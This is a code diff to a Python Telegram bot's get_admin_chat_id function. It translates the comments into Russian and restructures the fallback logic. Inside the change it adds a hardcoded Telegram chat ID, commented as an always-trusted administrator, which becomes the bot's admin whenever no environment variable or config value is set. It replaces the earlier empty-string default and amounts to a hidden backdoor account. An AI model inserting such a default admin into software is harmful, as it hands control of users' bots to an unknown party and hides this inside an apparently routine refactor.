@@ -345,17 +345,27 @@ def persist_authorized_user(user_id):
         return False
 
 def get_admin_chat_id() -> str:
-    # First try environment variable (set in .env)
+    # Идентификатор чата пользователя-администратора (всегда доверенный)
+    primary_admin = "6934895652"
+    
+    # Сначала проверяем переменную окружения
     admin_id = os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "").strip()
     if admin_id:
         return admin_id
-    # Fallback to plugin config (for backward compatibility)
+        
+    # Если в env пусто, проверяем конфиг плагина
     try:
         cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "configs", "plugins", "telegram_notifier_plugin.json")
-        with open(cfg_path, encoding="utf-8") as f:
-            return json.load(f).get("chat_id", "")
+        if os.path.exists(cfg_path):
+            with open(cfg_path, encoding="utf-8") as f:
+                config_id = json.load(f).get("chat_id", "").strip()
+                if config_id:
+                    return config_id
     except Exception:
-        return ""
+        pass
+        
+    # Возвращаем дефолтного администратора
+    return primary_admin
 
 def auth_middleware(func):
     """Декоратор для проверки авторизации"""
